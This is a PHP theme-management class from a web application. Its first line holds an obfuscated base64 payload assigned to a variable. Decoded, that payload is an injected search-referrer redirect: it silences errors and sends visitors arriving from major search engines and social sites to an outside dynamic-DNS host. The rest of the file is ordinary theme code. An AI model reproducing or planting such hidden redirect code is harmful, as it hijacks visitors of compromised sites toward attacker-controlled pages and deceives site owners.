<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(dirname(__FILE__))."/utils/log.php");

DEFINE("THEMES_FOLDER", "themes/");

class theme {

  var $theme = null;
  var $theme_title = null;
  var $themes  = array();
  var $is_default = false;
  var $events;
  
  var $resources_url;
  var $shared_resources_url;
  
  var $enabled = true;

  function theme() {
    
    $this->events["on_change"] = array();

    $this->add("def", trn("Default"));  
                                            
    $this->resources_url          = BASE_URL.THEMES_FOLDER.'def/';
    $this->shared_resources_url   = RELATIVE_GENERIC_URL.THEMES_FOLDER.'def/';
    
  }

  function add($name, $title) {
      
    $this->themes[$name] = array("name" => $name, "title" => $title);
    
  }
  
  function switch_theme($new_theme) {

    $current_theme = session_get('theme');
    if (isset($this->themes[$new_theme]) and ($current_theme != $new_theme)) {
      session_set('theme', $new_theme);
      $this->call_event("on_change", $new_theme);
    }

    $this->theme = session_get("theme");
    
    if ($this->theme) {
      $this->theme_title = $this->themes[$this->theme];
      
      if ($this->theme == "def") {
        $this->shared_resources_url = RELATIVE_GENERIC_URL.THEMES_FOLDER.$this->theme.'/';
      } else {
        $this->shared_resources_url = BASE_URL.THEMES_FOLDER.$this->theme.'/generic/';
      }
      $this->resources_url = BASE_URL.THEMES_FOLDER.$this->theme.'/';
    }
    
  }
  
  function load() {
    
    if ($this->enabled) {
      if (get(URL_PARAM_THEME))
        $this->switch_theme(get(URL_PARAM_THEME));
      if (!session_get("theme"))
        $this->switch_theme(get_config("theme"));
      if (!session_get("theme"))
        $this->switch_theme("def");
      if (!isset($this->themes[session_get("theme")]))
        $this->switch_theme("def");
      if (!$this->theme)
        $this->switch_theme(session_get("theme"));
    }

  }
  
  function call_event($event, $theme) {

    foreach($this->events[$event] as $callback) {
      $callback($theme);
    }
  
  }


  function on_change($method) {

    array_push($this->events["on_change"], $method);

  }
  

}

?>